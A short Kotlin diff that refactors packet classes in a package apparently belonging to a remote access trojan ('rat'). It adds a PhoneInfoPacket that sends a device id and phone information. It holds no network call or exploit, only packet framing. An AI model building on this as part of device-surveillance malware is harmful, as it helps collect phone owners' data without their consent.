@@ -1,23 +1,22 @@
 package ru.awawa.rat.worker.helper.protocol
 
+import ru.awawa.rat.worker.helper.toByteArray
 import java.nio.charset.Charset
 
-fun intToBytes(number: Int): ByteArray {
-    val result = ByteArray(4)
-    result[0] = (number.and(0xff)).toByte()
-    result[1] = (number.shr(8).and(0xff)).toByte()
-    result[2] = (number.shr(16).and(0xff)).toByte()
-    result[3] = (number.shr(24).and(0xff)).toByte()
-    return result
-}
 
 interface Packet {
-    val magicNumber: Int
+    val magicNumber: MagicNumber
     val data: ByteArray
 }
 
-class StartPacket(id: String): Packet {
+class StartPacket(val id: String): Packet {
 
-    override val magicNumber: Int = 0xffbbeedd.toInt()
-    override val data = intToBytes(magicNumber) + id.toByteArray(Charset.forName("UTF-8"))
+    override val magicNumber: MagicNumber = MagicNumber.START
+    override val data = magicNumber.value.toByteArray() + id.toByteArray(Charset.forName("UTF-8"))
+}
+
+class PhoneInfoPacket(val id: String, val info: String): Packet {
+
+    override val magicNumber: MagicNumber = MagicNumber.PHONE_INFO
+    override val data = magicNumber.value.toByteArray() + "$id\n$info".toByteArray(Charset.forName("UTF-8"))
 }
